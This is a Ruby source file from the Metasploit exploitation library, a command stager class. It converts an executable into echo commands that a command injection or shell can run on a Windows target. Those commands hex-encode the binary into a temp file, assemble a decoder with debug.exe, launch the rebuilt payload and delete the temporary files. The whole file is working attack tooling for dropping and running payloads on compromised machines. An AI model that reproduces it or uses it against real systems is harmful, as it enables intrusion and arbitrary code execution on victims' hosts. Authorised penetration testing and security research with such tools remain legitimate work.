# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

###
#
# This class provides the ability to create a sequence of commands from an executable.
# When this sequence is ran via command injection or a shell, the resulting exe will
# be written to disk and executed.
#
# This particular version uses debug.exe to assemble a small COM file. The COM will
# take a hex-ascii file, created via echo >>, and decode it to the final binary.
#
# Requires: debug.exe
#
# Written by Joshua J. Drake
#
###

class CmdStagerDebugAsm < CmdStagerBase

  def initialize(exe)
    super

    @var_decoder_asm  = Rex::Text.rand_text_alpha(8) + ".dat"
    @var_decoder_com  = Rex::Text.rand_text_alpha(8) + ".com"
    @var_payload_in   = Rex::Text.rand_text_alpha(8) + ".dat"
    @var_payload_out  = Rex::Text.rand_text_alpha(8) + ".exe"
    @decoder          = nil # filled in later
  end


  #
  # Override just to set the extra byte count
  #
  def generate_cmds(opts)
    # Set the start/end of the commands here (vs initialize) so we have @tempdir
    @cmd_start = "echo "
    @cmd_end   = ">>#{@tempdir}#{@var_payload_in}"
    xtra_len = @cmd_start.length + @cmd_end.length + 1
    opts.merge!({ :extra => xtra_len })
    super
  end


  #
  # Simple hex encoding...
  #
  def encode_payload(opts)
    ret = @exe.unpack('H*')[0]
  end


  #
  # Combine the parts of the encoded file with the stuff that goes
  # before / after it.
  #
  def parts_to_commands(parts, opts)

    cmds = []
    parts.each do |p|
      cmd = ''
      cmd << @cmd_start
      cmd << p
      cmd << @cmd_end
      cmds << cmd
    end

    cmds
  end


  #
  # Generate the commands that will decode the file we just created
  #
  def generate_cmds_decoder(opts)

    # Allow decoder stub override (needs to input base64 and output bin)
    @decoder = opts[:decoder] if (opts[:decoder])

    # Read the decoder data file
    f = File.new(@decoder, "rb")
    decoder = f.read(f.stat.size)
    f.close

    # Replace variables
    decoder.gsub!(/decoder_stub/, "#{@tempdir}#{@var_decoder_asm}")
    decoder.gsub!(/h2b\.com/, "#{@tempdir}#{@var_decoder_com}")
    # NOTE: these two filenames MUST 8+3 chars long.
    decoder.gsub!(/testfile\.dat/, "#{@var_payload_in}")
    decoder.gsub!(/testfile\.out/, "#{@var_payload_out}")

    # Split it apart by the lines
    decoder.split("\n")
  end


  #
  # We override compress commands just to stick in a few extra commands
  # last second..
  #
  def compress_commands(cmds, opts)
    # Convert the debug script to an executable...
    cvt_cmd = ''
    if (@tempdir != '')
      cvt_cmd << "cd %TEMP% && "
    end
    cvt_cmd << "debug < #{@tempdir}#{@var_decoder_asm}"
    cmds << cvt_cmd

    # Convert the encoded payload...
    cmds << "#{@tempdir}#{@var_decoder_com}"

    # Make it all happen
    cmds << "start #{@tempdir}#{@var_payload_out}"

    # Clean up after unless requested not to..
    if (not opts[:nodelete])
      cmds << "del #{@tempdir}#{@var_decoder_asm}"
      cmds << "del #{@tempdir}#{@var_decoder_com}"
      cmds << "del #{@tempdir}#{@var_payload_in}"
      # XXX: We won't be able to delete the payload while it is running..
    end

    super
  end

  # Windows uses & to concat strings
  def cmd_concat_operator
    " & "
  end

end
end
end
